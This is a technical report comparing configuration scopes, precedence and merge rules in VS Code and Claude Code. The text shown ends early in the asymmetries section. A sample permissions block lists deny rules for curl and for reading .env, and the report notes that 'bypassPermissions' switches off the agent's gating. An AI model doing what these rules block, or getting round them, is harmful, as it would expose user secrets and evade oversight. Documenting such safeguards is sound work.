---
title: "Per-Scope Configuration in VS Code and Claude Code: Topology, Surfaces, Cascades"
description: "Side-by-side factual landscape of how a mature GUI editor (VS Code) and a young CLI agent (Claude Code) handle per-user-global / per-project / per-user-project configuration. Covers scope hierarchy, storage, edit surface, sync, override semantics; surface-by-surface equivalence table; structural asymmetries; design-choice analysis; touch on git/ESLint/JetBrains/npm/Cursor for grounding; deeper sections on VS Code Profiles internals, Workspace Trust vs permissions DSL threat models, and the cross-product `.local`-suffix override pattern."
createdAt: 2026-04-25
updatedAt: 2026-04-26
lastUpdate: "2026-04-26: /audit-driven corrections applied — 4 medium and 6 low findings resolved (count fixes, ESLint quote re-attributed to accurate cascade-specific blog text, bypassPermissions exempt-from-exempt subset added, sync-rebrand-history hedge restored). 2026-04-26: D8 concurrent-window behavior gap closed (Finding D8.11). 2026-04-25: Follow-up extensions added — D8 (Profiles internals), D9 (threat models), D10 (.local-suffix patterns)."
subjects:
  - VS Code
  - Claude Code
  - settings.json
  - .code-workspace
  - Settings Sync
  - Settings Profiles
  - CLAUDE.md
  - .claude/agents
  - .claude/skills
  - .mcp.json
  - git config
  - ESLint
  - JetBrains
  - npm
  - Cursor
topics:
  - configuration topology
  - scope hierarchy
  - precedence and cascading
  - dual-surface editing
  - per-project vs per-user
  - admin/managed policy
  - agent-trust DSL
---

# Per-Scope Configuration in VS Code and Claude Code: Topology, Surfaces, Cascades

**Purpose:** Build a side-by-side conceptual map of how two developer tools — one a mature GUI editor (VS Code, ~10 years), one a young CLI agent (Claude Code, ~2 years) — handle the per-user-global / per-project / per-user-project axis. The reader cares most about: what scopes exist in each, what kind of thing can live at which scope, how precedence works, what surfaces (UI vs file) are kept in sync, what's exclusive to one product's model. Stance: **factual landscape only — no recommendations.**

---

## Executive Summary

Both products converge on a **4-5 layer scope ladder + a project-tree directory + a first-class admin/policy layer at the top**. They diverge in five places that matter:

1. **Override semantics for arrays** are opposite-defaulted. VS Code arrays *override* across scopes; Claude Code arrays *merge* (concatenate + dedup). This is the most consequential single difference for security model — Claude Code's project-level `permissions.deny` *adds to* user-level deny, where a VS Code workspace array would *replace* the user array.
2. **VS Code is editor-feature-rich along axes Claude Code structurally lacks:** per-language `[language-id]` overrides, per-folder (multi-root) settings, Profiles (named bundles with per-workspace association), first-party Settings Sync, snippets/tasks/debug as first-class config categories.
3. **Claude Code is agent-trust-rich along axes VS Code structurally lacks:** a permissions DSL in settings, hooks declared as settings (no extension code required), CLAUDE.md text-as-context hierarchy, markdown-defined commands/skills/agents, CLI flags as a first-class scope in the precedence chain, project-local-personal override (`.claude/settings.local.json`) as a named supported surface.
4. **Edit surface:** VS Code maintains a true dual surface (Settings UI ↔ `settings.json` kept structurally in sync). Claude Code is file-first with fragmented per-concern slash commands (`/permissions`, `/memory`, `/agents`, `/mcp`, `/model`, `/statusline`); `/config` survives only as a credential toggle.
5. **The "my override of this project's settings, not pushed to teammates" use case** has a named, supported surface in Claude Code (`.claude/settings.local.json`) and no clean equivalent in VS Code (best-effort via Profiles, unstaged edits, or User scope leakage).

**Key cross-walk:** "Workspace settings" in VS Code ≈ "Project settings" in Claude Code (committed, team-shared); "User settings" ≈ "User settings" (per-OS-user, follows the user). VS Code's `Workspace Folder` (multi-root) and per-language overrides have no Claude Code analog. Claude Code's `Local`, `Managed-only fields`, `permissions`, `hooks`, and `CLAUDE.md` have no VS Code analog.

**Pattern:** The clustering of asymmetries reflects what each product *is*. VS Code's scope topology grew along editor-feature axes over a decade. Claude Code's grew along agent-trust and CLI axes in two years. Neither has built much in the other's lane because the use cases don't overlap — VS Code doesn't gate `Bash(curl:*)` because shell execution isn't a primary workflow; Claude Code doesn't have per-language tab settings because it doesn't render files for human editing.

**Three deeper threads** added in the follow-up pass (D8/D9/D10):

- **VS Code Profiles internals (D8):** the source-of-truth resource enum has 8 categories (not 7 as the docs say); workspace-profile bindings live in the user-data state service, opaque to the project tree; deleting a bound Profile silently orphans its workspaces (degrades to Default with no fallback record); profile switches restart the extension host (terminating MCP servers); Sync identifies Profiles by *name*, producing documented data-loss bugs on delete-and-recreate cycles (#208710).
- **Threat-model asymmetry (D9):** Workspace Trust and the permissions DSL solve different threat classes. Trust gates *code execution on workspace open* (extensions, tasks, debug, restricted settings) and was consolidated in 2021 from per-feature modal prompts in response to the **2018 ESLint supply-chain incident** — the actual packages were `eslint-scope@3.7.2` and `eslint-config-eslint@5.0.2`, *not* "eslint-loader" (a common folk-memory conflation). The permissions DSL gates *per-tool-call by an autonomous agent* and was greenfield. Each leaves the other's class largely undefended: Trust does not gate symlinks or runtime instruction injection; the DSL's Bash argument patterns are explicitly fragile (docs recommend deny + WebFetch + hooks instead), project hooks have no per-hook approval gate analogous to the `@import` external-file CLAUDE.md prompt, and `bypassPermissions` mode wholesale disables the gating. Cursor (a VS Code fork) ships Workspace Trust default-off because enabling it disables Cursor's AI features — a trade-off AI-augmented editors generally face when the AI integration ships as Restricted-Mode-incompatible extension code.
- **The `.local`-suffix pattern across products (D10):** Claude Code's `.claude/settings.local.json` is squarely in the *dominant ecosystem convention* — first-classed in Next.js / dotenv-flow `.env.local`, Docker Compose `compose.override.yaml`, and lefthook `lefthook-local.yml`; convention-only via primitives in direnv (`source_env_if_exists`) and git (`.git/info/exclude`); category-separated rather than overlay in JetBrains (`.idea/workspace.xml` etc.); and *absent and unbuilt* in VS Code (five separate community requests since 2017, most recent open December 2025), Cursor, and husky. The pattern correlates with whether the tool already has a multi-file merge pipeline — env loaders, Compose, hooks runners ship it; single-file editor-config tools generally don't.

---

## Research Rubric

| # | Dimension | Depth | Stance |
|---|-----------|-------|--------|
| D1 | Conceptual axes for this comparison | Light | Factual |
| D2 | VS Code: full scope topology | Deep | Factual |
| D3 | Claude Code: full scope topology | Deep | Factual |
| D4 | Side-by-side: same conceptual surface in each | Deep | Factual |
| D5 | Asymmetries: what one can do that the other can't | Moderate | Factual |
| D6 | Interesting design choices: where each split or unified a concept | Moderate | Factual |
| D7 | Brief comparison-product touch (git/ESLint/JetBrains/npm/Cursor) | Light | Factual |
| D8 | VS Code Profiles internals (added 2026-04-25 follow-up) | Deep | Factual |
| D9 | Workspace Trust vs permissions DSL — threat models (added 2026-04-25 follow-up) | Deep | Factual |
| D10 | Project-local-personal override patterns across products (added 2026-04-25 follow-up) | Moderate | Factual |

**Non-goals:** Apple defaults / XDG / 12-Factor lineage history; broad 15-product matrix; performance / load-time analysis; schema validation libraries (covered in `reports/config-edit-paths/`); 1P analysis of Open Knowledge's `.open-knowledge/config.yml`.

---

## D1 — Conceptual Axes for This Comparison

The example prompt sketched six axes (term, scope, storage, sync, lifecycle, visibility). For *this* comparison, five suffice — and one is replaced by a more useful axis.

| Axis | Question to ask of either product |
|------|-----------------------------------|
| **1. Scope hierarchy** | What scopes exist + which beats which? |
| **2. Storage location** | Where does each scope physically live on disk? |
| **3. Edit surface** | Where does the user actually mutate the value (UI / file / CLI / API)? |
| **4. Sync semantics** | Does the value follow the user across machines? Across the team? |
| **5. Override semantics** | When the same key is set in two scopes, does the higher win, or do they merge? |

The dropped axes — *term* (Configuration vs Settings vs Preferences) and *lifecycle* (build-time vs boot-time vs hot-reload) — don't separate the two products materially. Both call most of it "settings." Both apply most settings live, both require restarts for a small set.

The axes above *do* separate them. **Evidence:** [evidence/d1-axes.md](evidence/d1-axes.md).

| Axis | Both same | Materially diverge | Where the divergence shows up |
|------|-----------|--------------------|--------------------------------|
| 1. Scope hierarchy | Both have 4-5 layer ladders with policy on top | Yes | Workspace Folder (multi-root) is VS Code-only; Local-overrides-Project is Claude Code-only |
| 2. Storage location | Both use OS-XDG for user; project tree for workspace/project | Yes | VS Code splits into many files in `.vscode/`; Claude Code keeps most in one `settings.json` |
| 3. Edit surface | Both expose CLI, file, and some UI | Strongly | VS Code dual-surface UI ↔ JSON; Claude Code file-first with fragmented per-concern UI |
| 4. Sync semantics | Both lean on git for project; both have user dotfile possibility | Yes | VS Code has first-party Settings Sync; Claude Code has none |
| 5. Override semantics | Both default override for primitives | Yes | Object merge (VS Code) vs Array merge (Claude Code) — different categories of merging |

---

## D2 — VS Code: Full Scope Topology

VS Code's configuration system is one of the most carefully-formalized in any developer tool. Five base scopes, eight effective `inspect()` slots, six per-setting `scope` tag values, three `ConfigurationTarget` write targets, and a structurally-synced UI ↔ JSON dual surface. **Evidence:** [evidence/d2-vscode-topology.md](evidence/d2-vscode-topology.md).

### The five-scope ladder

Per `WorkspaceConfiguration.inspect()` ([microsoft/vscode source](https://github.com/microsoft/vscode/blob/main/src/vscode-dts/vscode.d.ts), ~line 6759), the effective value is computed by overriding/merging across these slots:

```
1. defaultValue                       (built-in defaults from extension package.json)
2. globalValue                        (User settings)
3. workspaceValue                     (Workspace settings, including .code-workspace)
4. workspaceFolderValue               (per-folder .vscode/settings.json in multi-root)
5. defaultLanguageValue
6. globalLanguageValue
7. workspaceLanguageValue
8. workspaceFolderLanguageValue
```

Higher slot wins. Language-suffixed slots take precedence over their non-language siblings within the same scope. Policy/admin settings sit above all.

### Per-setting `scope` tag

Each setting registered via `contributes.configuration` declares one of six string values (verified via [VS Code Contribution Points docs](https://code.visualstudio.com/api/references/contribution-points)):

| `scope` | Meaning (verbatim from docs) |
|---------|------------------------------|
| `application` | "apply to all instances of VS Code and can only be configured in user settings" |
| `machine` | "set only in user settings or only in remote settings ... not synchronized" |
| `machine-overridable` | "can be overridden by workspace or folder settings ... not synchronized" |
| `window` | "can be configured in user, workspace, or remote settings" (default if scope omitted) |
| `resource` | "apply to files and folders, can be configured in all settings levels, even folder settings" |
| `language-overridable` | "Resource settings that can be overridable at a language level" |

The internal `ConfigurationScope` enum in `configurationRegistry.ts` adds a private 7th value (`APPLICATION_MACHINE`) for default-profile + remote-only settings. The tag is the *contract* by which an extension constrains where its settings can be written, governing which `ConfigurationTarget` writes are accepted.

### Storage layout

| Scope | Path (macOS) |
|-------|--------------|
| User settings | `~/Library/Application Support/Code/User/settings.json` |
| User keybindings | `~/Library/Application Support/Code/User/keybindings.json` |
| Profile settings | `~/Library/Application Support/Code/User/profiles/<profile-id>/settings.json` |
| Workspace settings | `<repo>/.vscode/settings.json` |
| Workspace Folder (multi-root) | per-folder `<folder>/.vscode/settings.json` |
| Multi-root Workspace | `settings` block inside the `<name>.code-workspace` JSON |

Linux mirrors this under `~/.config/Code/User/`; Windows under `%APPDATA%\Code\User\`. Multi-root workspace settings live *inside* the `.code-workspace` file itself, not under any folder's `.vscode/`.

### `.vscode/` directory

The de facto industry default for what to commit comes from [GitHub's official gitignore template](https://github.com/github/gitignore/blob/main/Global/VisualStudioCode.gitignore) — ignore `.vscode/*`, then allowlist `settings.json`, `tasks.json`, `launch.json`, `extensions.json`, `*.code-snippets`. Per-feature roles:

- `settings.json` — workspace settings
- `launch.json` — debug configurations
- `tasks.json` — task configurations
- `extensions.json` — recommended extensions (`recommendations` + `unwantedRecommendations`)
- `mcp.json` — MCP server configurations at workspace scope (added when VS Code shipped MCP support)
- `*.code-snippets` — workspace-scoped snippets

`.vscode/` does **not** host `keybindings.json`. Keybindings are user-only across all OSes, with append-and-negate override semantics (`{ "command": "-builtin.action" }` removes a default binding). Keybindings break the "every file has a workspace counterpart" pattern — they are categorically user/profile only.

### Multi-root workspaces

A `.code-workspace` file is a JSON document with a `folders` array (paths + display names) plus its own `settings` / `extensions` / `launch` / `tasks` blocks. The cascade is User → Workspace → Folder, with Folder beating Workspace beating User. This introduces a 4th physical config surface between User and Folder — a tool that scans only `.vscode/settings.json` will miss workspace-file overrides.

The Extension API exposes a 3-value `ConfigurationTarget` enum (`Global=1`, `Workspace=2`, `WorkspaceFolder=3`) plus an `overrideInLanguage` boolean — read sees 8 slots; write addresses 3 targets.

### Object-merge / primitive-array-override

A subtle but high-impact rule: object-typed settings *merge* across scopes, primitive and array-typed settings *override*. From the docs:

```
Example 3: Object Values
defaultValue = { "a": 1, "b": 2 };
globalValue  = { "b": 3, "c": 4 };
value        = { "a": 1, "b": 3, "c": 4 };

"Values with primitive types and Array types are overridden ... 
 But, values with Object types are merged."
```

Same key + same scope ladder produces different shapes depending on JSON type. A downstream consumer cannot uniformly say "the workspace value wins" without checking the value type.

### Language-scoped overrides

Inside any `settings.json`:

```json
{
  "[typescript]": { "editor.formatOnSave": true, "editor.formatOnPaste": true },
  "[markdown]":   { "editor.wordWrap": "on" },
  "[javascript][typescript]": { "editor.tabSize": 2 }
}
```

Only settings declared with `scope: "language-overridable"` accept these per-language overrides. Language overrides are a parallel dimension that multiplies each scope by the set of language IDs declared — they are not a "scope" in the ladder sense.

### Settings UI ↔ JSON dual surface

The Settings UI (`Cmd+,`) and `settings.json` are kept in *structural* sync via `ConfigurationEditingService`. Every UI write produces a deterministic JSON edit preserving comments and formatting; every schema-registered setting gets autocomplete in the JSON editor. There is no "UI-only" surface for registered settings — the JSON is always authoritative. The `workbench.settings.editor: "json"` setting makes keyboard shortcuts default to JSON editing.

### Settings Sync

Opt-in cloud sync via Microsoft or GitHub account (GitHub Enterprise not supported). Syncs a fixed 7-category bundle: Settings, Keyboard shortcuts (per-platform by default), User snippets, User tasks, UI State, Extensions (and enablement state), Profiles. `machine`-scoped settings are skipped by default. User-controlled override via `settingsSync.ignoredSettings` and `settingsSync.ignoredExtensions` arrays. Conflict UX: Accept Local | Accept Remote | Show Conflicts (diff editor). Per-extension opt-out via `ignoreSync` schema flag.

### Profiles

A Profile is a bundle: Settings + Keyboard shortcuts + Snippets + Tasks + Extensions + UI State + MCP servers (per docs; the source-of-truth `ProfileResourceType` enum has eight categories — see §D8). Profiles can be created/exported/imported via `.code-profile` files. The live config is the implicit "Default Profile." Crucially, **profiles bind per-workspace**: opening a folder activates its bound profile. Profiles can themselves be synced via Settings Sync when "Profiles" is checked under Sync configuration.

### MCP (Model Context Protocol) servers

MCP integration follows a scope tripartite: workspace `.vscode/mcp.json`, user-profile `mcp.json` (opens via "MCP: Open User Configuration" command), and dev-container customizations under `devcontainer.json` → `customizations.vscode.mcp`. User-level MCP configurations are profile-bound — each profile maintains its own separate MCP server configuration.

---

## D3 — Claude Code: Full Scope Topology

Claude Code's configuration system is younger and shaped by a different intent — a programmatic agent harness invoked from interactive CLI, scripts, CI, and an SDK. Five precedence positions (User → Project → Local → CLI → Managed), with array-merge across scopes and a per-field "Valid Scopes" enforcement that's asymmetric for security. **Evidence:** [evidence/d3-claude-code-topology.md](evidence/d3-claude-code-topology.md).

### The five-position precedence chain

Verified directly from [code.claude.com/docs/en/settings](https://code.claude.com/docs/en/settings) (accessed 2026-04-25):

```
1. Managed (highest) - can't be overridden by anything
2. Command line arguments - temporary session overrides
3. Local - overrides project and user settings
4. Project - overrides user settings
5. User (lowest) - applies when nothing else specifies the setting
```

The structural notable: **Local sits *above* Project**, not below. An individual contributor's `.claude/settings.local.json` (gitignored by convention) can override a team-shared `.claude/settings.json` (committed). Managed is the only true ceiling. CLI flags are themselves a scope in the chain, between Local and Managed.

### Storage layout

| Scope | Path |
|-------|------|
| User | `~/.claude/settings.json` |
| Project | `<repo>/.claude/settings.json` (committed) |
| Local | `<repo>/.claude/settings.local.json` (gitignored) |
| Managed (macOS) | `/Library/Application Support/ClaudeCode/managed-settings.json` |
| Managed (Linux) | `/etc/claude-code/managed-settings.json` |
| Managed (Windows) | `C:\Program Files\ClaudeCode\managed-settings.json` |

Managed has **multiple physical sources** that all contribute: a primary file, a drop-in `.d/` directory (`managed-settings.d/*.json`), an MDM plist domain `com.anthropic.claudecode` on macOS, and Windows registry policy at `HKLM\SOFTWARE\Policies\ClaudeCode` (with `HKCU\SOFTWARE\Policies\ClaudeCode` as the lowest-priority policy source).

### Array merge across scopes

Verified directly from the Settings docs:

```
Array settings merge across scopes. When the same array-valued setting (such as
sandbox.filesystem.allowWrite or permissions.allow) appears in multiple scopes,
the arrays are concatenated and deduplicated, not replaced.

Example:
managed: allowWrite: ["/opt/company-tools"]
user:    allowWrite: ["~/.kube"]
result:  ["/opt/company-tools", "~/.kube"]
```

This is the *opposite* default from VS Code, and it has direct security consequences: a `permissions.deny` array declared at project scope *adds to* user-scope deny rules. No scope can subtract from a higher-priority array. For a permission-rule context this is the intuitive behavior (every layer's deny applies); for a preference context (e.g., `editor.rulers`) it would be confusing — but Claude Code's headline use of arrays *is* permission rules, not preferences.

### Per-field "Valid Scopes" — and the asymmetric exclusions

The Settings docs include a "Valid Scopes" column per field. Two notable categories:

**Managed-only fields** (function only in managed settings; ignored elsewhere): `allowManagedPermissionRulesOnly`, `allowManagedHooksOnly`, `allowManagedMcpServersOnly`, `allowedMcpServers`, `deniedMcpServers`, `strictKnownMarketplaces`, `blockedMarketplaces`, `allowedChannelPlugins`, `channelsEnabled`, `pluginTrustMessage`, `forceLoginMethod`, `forceLoginOrgUUID`, `forceRemoteSettingsRefresh`, `sandbox.failIfUnavailable`, `sandbox.filesystem.allowManagedReadPathsOnly`, `sandbox.network.allowManagedDomainsOnly`, `disableSkillShellExecution`, `wslInheritsWindowsSettings`, `allowedHttpHookUrls`.

**User + Local + Managed (project-disallowed)**: `apiKeyHelper`, `awsCredentialExport`, `awsAuthRefresh`, `otelHeadersHelper`, `permissions.skipDangerousModePermissionPrompt`, `autoMode`, `useAutoModeDuringPlan`, `autoMemoryDirectory`, `sshConfigs`. The rationale (documented for `autoMemoryDirectory`):

```
"It is not accepted from project settings (.claude/settings.json) to prevent
a shared project from redirecting auto memory writes to sensitive locations"
```

That is, high-trust fields are **excluded from project (committed) scope** to prevent supply-chain-style attacks via PRs — a contributor can't sneak a credential-helper redirect into a shared `.claude/settings.json`. VS Code does not have an equivalent threat model.

### CLAUDE.md hierarchy

CLAUDE.md is a *separate category* from `settings.json` — long-form text instructions injected into the LLM's context at session start, scoped per-policy / per-project / per-user / per-project-local:

```
- Managed policy CLAUDE.md  (e.g. /Library/Application Support/ClaudeCode/CLAUDE.md)
- Project instructions      (./CLAUDE.md or ./.claude/CLAUDE.md)
- User instructions         (~/.claude/CLAUDE.md)
- Local instructions        (./CLAUDE.local.md, gitignored)

"All discovered files are concatenated into context rather than overriding each other."
```

The hierarchy *concatenates*, doesn't override — every layer's instructions all apply. The project layer has a recursive parent-walk: Claude walks up the directory tree from `cwd`, loading every `CLAUDE.md` it finds. Subdirectory `CLAUDE.md` files are loaded *lazily* — included only when Claude reads files in those subdirectories, and don't survive `/compact`. Imports use `@path/to/file` syntax with a depth-5 limit; first time an external import appears in a project, Claude prompts for approval. A `claudeMdExcludes` array in any settings layer skips ancestor CLAUDE.md files by absolute-path glob — except managed policy CLAUDE.md, which cannot be excluded.

### Permissions

The `permissions` block in any settings layer:

```json
{
  "permissions": {
    "allow": ["Bash(npm run *)", "Read(./src/**)", "Skill(deploy)"],
    "ask":   ["WebFetch(domain:*)"],
    "deny":  ["Bash(curl:*)", "Read(./.env)"],
    "defaultMode": "default",
    "additionalDirectories": ["~/scratch"]
  }
}
```

Two precedence axes interact:
1. **Within a scope**: `deny` > `ask` > `allow`. First matching rule wins.
2. **Across scopes**: managed > CLI > local > project > user, *with array-merge*.

The cross-scope rule cuts both directions — a project deny *can* be overridden by a local allow (because local sits above project in precedence). But arrays merge, so a `deny` rule from any scope still applies. Net: hardest to escape are managed denies; easiest is anything local can allow.

The DSL spans every major capability surface: `Bash(specifier)` (glob with `*`), `Read(path)` and `Edit(path)` (gitignore-style paths with `//absolute`, `~/home`, `/project-root`, `./cwd` prefixes; symlinks checked against both link and target), `WebFetch(domain:example.com)`, `mcp__server__tool`, `Skill(name)`, `Agent(name)`. Permission modes: `default`, `acceptEdits`, `plan`, `auto`, `dontAsk`, `bypassPermissions`. The `/permissions` slash command is a UI surface listing all rules with their source files. Managed-only `allowManagedPermissionRulesOnly: true` blocks user/project from defining any rules — only managed rules apply.

### Hooks

The `hooks` block in settings is a first-class user-authored category — no extension code required. Six scope locations: managed → user → project → local → plugin → skill/agent frontmatter. Hook source is *labeled* in output (`[User]`, `[Project]`, `[Local]`, `[Plugin]`, `[Session]`, `[Built-in]`).

There is **no per-hook approval prompt** for hooks declared in settings files. Trust comes from scope provenance — project hooks are vetted via `git diff` review; managed hooks are IT-controlled. Compare with the `@import` external-file CLAUDE.md prompt (which *does* gate first-use): hooks intentionally do not have that gate. `allowManagedHooksOnly: true` is the enterprise off-switch; `disableAllHooks: true` disables everything (and respects hierarchy — user-level cannot disable managed hooks).

The event taxonomy is rich (~30 event types): session-level (`SessionStart`, `SessionEnd`, `InstructionsLoaded`); per-turn (`UserPromptSubmit`, `Stop`); tool execution (`PreToolUse`, `PostToolUse`, `PermissionRequest`); agent lifecycle (`SubagentStart`, `TaskCreated`); environment (`ConfigChange`, `CwdChanged`, `FileChanged`); compaction (`PreCompact`, `PostCompact`); MCP elicitation; worktree events. Handler types: `command` (default), `http`, `mcp_tool`, `prompt`, `agent`. HTTP hooks gate egress via `allowedHttpHookUrls` allowlist.

### Subagents (`.claude/agents/`)

Markdown files with rich frontmatter — `name`, `description`, `tools`, `disallowedTools`, `model`, `permissionMode`, `maxTurns`, `skills`, `mcpServers`, `hooks`, `memory` (`user|project|local`), `background`, `effort`, `isolation` (`worktree` runs in temp git worktree), `color`, `initialPrompt`. Scope precedence: SDK `agents` > CLI `--agents` > project `.claude/agents/` > user `~/.claude/agents/` > plugin agents. Per-agent `permissionMode` and `mcpServers` blocks duplicate settings.json shape *inside* the agent's frontmatter — the scope topology is recursive.

### Slash commands → merged into Skills

A 2026 change: custom slash commands have been merged into Skills. From [code.claude.com/docs/en/skills](https://code.claude.com/docs/en/skills):

```
"Custom commands have been merged into skills. A file at .claude/commands/deploy.md
 and a skill at .claude/skills/deploy/SKILL.md both create /deploy and work the same way.
 Your existing .claude/commands/ files keep working.

 if a skill and a command share the same name, the skill takes precedence."
```

Scope hierarchy for skills/commands: Enterprise (managed) > Personal (`~/.claude/skills/`) > Project (`.claude/skills/`) > Plugin (`<plugin>/skills/`, namespaced). Within each level, frontmatter flags `disable-model-invocation` and `user-invocable` control whether Claude or the user can trigger.

### MCP servers

A 7-position scope ladder (depth covered in [the prior 2026-03-28 Claude Code configuration resolution report](#related-research)):

```
1. Managed/enterprise (allowedMcpServers, deniedMcpServers, allowManagedMcpServersOnly)
2. CLI flags (--mcp-config, --mcp-server, --strict-mcp-config)
3. Local settings (.claude/settings.local.json with mcpServers)
4. Project settings (.claude/settings.json with mcpServers)
5. User settings (~/.claude/settings.json with mcpServers)
6. claude.ai connectors (web-managed; toggled via ENABLE_CLAUDEAI_MCP_SERVERS env)
7. Plugin .mcp.json (lowest priority; namespaced)
```

Plus a *separate* file at the project scope: `.mcp.json` at repo root (committed). This is functionally a separate config surface from `.claude/settings.json` even though both can declare `mcpServers`. The trust gate (`enableAllProjectMcpServers`, `enabledMcpjsonServers`, `disabledMcpjsonServers`) lives in regular settings — a dual-file model unique to Claude Code. Install-time `--scope` was renamed in 2026: `project` → `local`, `global` → `user` (old values still accepted as aliases).

### CLI flags as a first-class scope

Where VS Code uses launch flags only for diagnostics, Claude Code's CLI flags *are* a first-class config layer in the precedence chain. Per-flag overrides include `--model`, `--permission-mode`, `--allowedTools`, `--disallowedTools`, `--add-dir`, `--mcp-config`, `--strict-mcp-config`, `--settings`, `--plugin-dir`, `--agents`, `--system-prompt`, `--append-system-prompt`. Two master mute switches:

- **`--bare`** — skips auto-discovery of hooks, skills, plugins, MCP, auto memory, CLAUDE.md (sets `CLAUDE_CODE_SIMPLE`)
- **`--setting-sources`** — comma list of `{user, project, local}` to load (default: all)

These exist because Claude Code is invoked programmatically (CI, scripts, SDK, nest-claude pattern) and needs filesystem auto-discovery as something a caller can disable.

### Environment variables

The `env` block in settings.json sets per-session env vars but **does not override credential resolution**, which has its own precedence ladder: cloud-provider env vars (`CLAUDE_CODE_USE_BEDROCK|VERTEX|FOUNDRY`) → `ANTHROPIC_AUTH_TOKEN` → `ANTHROPIC_API_KEY` → `apiKeyHelper` script output → `CLAUDE_CODE_OAUTH_TOKEN` → `/login` OAuth credentials. A user setting `ANTHROPIC_API_KEY` in `~/.claude/settings.json env` will not override an actual exported `ANTHROPIC_API_KEY` in the shell.

Behavioral env vars beyond credentials: `CLAUDE_CONFIG_DIR` (relocates `~/.claude/` — the closest thing Claude Code has to Profiles), `CLAUDE_CODE_DISABLE_AUTO_MEMORY=1`, `MCP_TIMEOUT`, `MAX_MCP_OUTPUT_TOKENS`, `ENABLE_TOOL_SEARCH`, `CLAUDE_CODE_USE_POWERSHELL_TOOL=1`.

### `/config` is not the canonical settings UI

The 2026 docs partition Settings UX by concern: `/permissions`, `/memory`, `/agents`, `/mcp`, `/model`, `/statusline`, `/hooks`, `/skills`. `/config` survives only as a credential-toggle UI ("'Use custom API key' toggle in /config"). There is no single "Settings" UI in Claude Code — the surface is fragmented by domain, with the file (`settings.json`) as source of truth.

---

## D4 — Side-by-Side: Same Conceptual Surface in Each

Where each conceptual configuration surface lives in each product. **Evidence:** [evidence/d4-side-by-side.md](evidence/d4-side-by-side.md).

| # | Conceptual surface | VS Code | Claude Code | Notes |
|---|---|---|---|---|
| 1 | User-global preferences | User Settings — `~/.../Code/User/settings.json`; Settings UI ▸ User tab | User Settings — `~/.claude/settings.json`; hand-edit | Equivalent. VS Code optionally cloud-syncs; Claude Code requires user-managed dotfiles |
| 2 | Team-shared project config (committed to VCS) | Workspace Settings — `.vscode/settings.json`; Settings UI ▸ Workspace tab | Project Settings — `.claude/settings.json` | Direct equivalent |
| 3 | **Per-developer per-project override (not committed)** | No first-class file. Closest: per-workspace Profile or User leakage | Local Settings — `.claude/settings.local.json` (gitignored) | **Asymmetric.** Claude Code has a named, supported surface; VS Code does not |
| 4 | Admin/policy lockdown across the org | Policy Settings — Group Policy / config profiles; per-setting `policy` opt-in | Managed Settings — OS-specific path + drop-in `.d/` + MDM plist + Windows registry | Equivalent layer; Claude Code's managed-only field set is more elaborate (~18 fields) |
| 5 | Per-folder override within a multi-folder repo | Workspace Folder Settings — per-folder `.vscode/settings.json` in multi-root | None for settings | **VS Code-only.** CLAUDE.md has recursive parent-walk but it's concatenation, not override |
| 6 | Multi-folder workspace as a discrete artifact | `.code-workspace` file with `folders[]` array + own settings | None | **VS Code-only.** `--add-dir` is session-scoped, not persistent |
| 7 | **Per-language overrides** | `[language-id]: { ... }` block + `language-overridable` scope tag | None | **VS Code-only structural feature** |
| 8 | Per-machine sticky settings (don't sync) | `machine` / `machine-overridable` scope tags + `settingsSync.ignoredSettings` | No formal mechanism (no first-party sync) | **VS Code-only first-party affordance** |
| 9 | Snippets | User + Workspace `.code-snippets` files | None directly | Closest Claude analog: skills/commands (semantically different) |
| 10 | Keybindings | `keybindings.json` (user-only); append-and-negate semantics | None (fixed terminal keybindings) | **VS Code-only category** |
| 11 | Tasks (build/test runners) | `tasks.json` (User + Workspace); typed schema | None directly | Closest Claude analog: hooks (event-driven) + slash commands |
| 12 | Debug configurations | `launch.json` (User + Workspace) | None | **VS Code-specific category** |
| 13 | Recommended extensions | `extensions.json` `recommendations[]` | None | **Asymmetric.** Claude has no "we suggest you install these" surface |
| 14 | MCP servers (project) | `.vscode/mcp.json` | `.mcp.json` + `mcpServers` in `.claude/settings.json` (committed) + `.claude/settings.local.json` (gitignored) | Claude has a redundancy — same servers can be in either file, with separate trust gate |
| 15 | MCP servers (user) | User-profile `mcp.json` | `mcpServers` in `~/.claude/settings.json` | Equivalent. VS Code binds per-Profile; Claude per-user-account |
| 16 | MCP servers (managed/admin) | Limited (per-setting `policy` opt-in) | First-class: `allowedMcpServers`, `deniedMcpServers`, `allowManagedMcpServersOnly` | **Claude Code-only first-class affordance** |
| 17 | **Long-form text instructions / persistent memory** | None first-class | CLAUDE.md hierarchy (Managed/Project/User/Local) + `@import` + recursive walk | **Claude Code-only category.** Cursor invented its own (`.cursor/rules/*.mdc`) |
| 18 | Slash commands / user-invocable shortcuts | Command Palette + custom keybindings; commands are extension code | `.claude/commands/` (legacy) + `.claude/skills/` (current) — markdown files with frontmatter | **Claude Code-only at user level.** VS Code requires an extension |
| 19 | Subagent / specialized worker definitions | None | `.claude/agents/` + `~/.claude/agents/` — markdown with rich frontmatter | **Claude Code-only category** |
| 20 | Hooks (lifecycle event handlers) | None first-class. Extensions subscribe via API | `hooks` block in settings | **Claude Code-only at settings layer** |
| 21 | Permissions (granular per-tool gating) | Not a settings concept. Workspace Trust = binary trust per folder | `permissions` block (allow/ask/deny) with rich DSL | **Claude Code-only first-class affordance** |
| 22 | Per-user profile bundles | Profiles — bundle of (settings + keybindings + snippets + tasks + extensions + UI state + MCP); per-workspace association; `.code-profile` | None. `CLAUDE_CONFIG_DIR` swaps `~/.claude/` but no UI/binding | **VS Code-only first-class category** |
| 23 | First-party multi-machine cloud sync | Settings Sync (Microsoft/GitHub account) | None | **VS Code-only** |
| 24 | CLI flags as a first-class config layer | Limited (`--user-data-dir`, `--profile`, `--disable-extensions`); diagnostic | First-class: `--model`, `--permission-mode`, `--allowedTools`, `--mcp-config`, `--bare`, `--setting-sources` | **Claude Code-only.** Sits between Managed and Local |
| 25 | Statusline | Built-in, configurable via settings + extensions | `statusLine` block — runs external command per render | Conceptually similar; different mechanisms |

**The clustering:** VS Code-only rows are editor-feature-rich (per-folder, per-language, snippets, tasks, debug, profiles, sync); Claude Code-only rows are agent-trust-rich (project-local override, CLAUDE.md, permissions, hooks, agents, managed-MCP, CLI-as-scope). Each product's scope topology grew along the axes its primary use case demanded.

---

## D5 — Asymmetries: What One Can Do That The Other Can't

A condensed map of structural and unbuilt asymmetries. Full details in [evidence/d5-asymmetries.md](evidence/d5-asymmetries.md).

### VS Code has, Claude Code doesn't

| # | What | Type | Example use case |
|---|------|------|------------------|
| A1 | Per-language scoped overrides | Structural | Different formatter rules in TypeScript vs Markdown |
